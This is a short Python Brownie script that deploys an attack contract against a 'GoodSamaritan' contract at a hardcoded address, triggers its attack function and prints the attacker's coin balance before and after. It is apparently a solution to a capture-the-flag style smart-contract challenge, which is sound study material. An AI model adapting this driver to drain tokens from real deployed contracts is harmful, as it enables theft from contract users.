from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import GoodSamaritan, AttackGoodSamaritan, Coin, network, Contract


##local testing
def deploy_GoodSamaritan():
    acc1 = get_account(index=1)
    good_samaritan = GoodSamaritan.deploy(
        {"from": acc1},
    )
    return good_samaritan


def deploy_AttackGoodSamaritan(good_samaritan):
    account = get_account()
    attack_contract = AttackGoodSamaritan.deploy(
        good_samaritan,
        {"from": account},
    )
    return attack_contract


def main():
    print(network.show_active())
    account = get_account()

    # good_samaritan = deploy_GoodSamaritan()  # local testing
    good_samaritan_address = "0x68bAA3c833f721197f4222B68460DDEE22B30Ee1"
    good_samaritan = Contract.from_abi(
        GoodSamaritan._name, good_samaritan_address, GoodSamaritan.abi
    )  # good_samaritan instead of good_samaritan_address for local testing

    coin_address = good_samaritan.coin()
    coin = Contract.from_abi(Coin._name, coin_address, Coin.abi)
    # deploy attack contract
    attack_contract = deploy_AttackGoodSamaritan(good_samaritan)

    print(f" Balance: {coin.balances(attack_contract)}")
    attack_contract.attack({"from": account})

    print(f" Balance: {coin.balances(attack_contract)}")
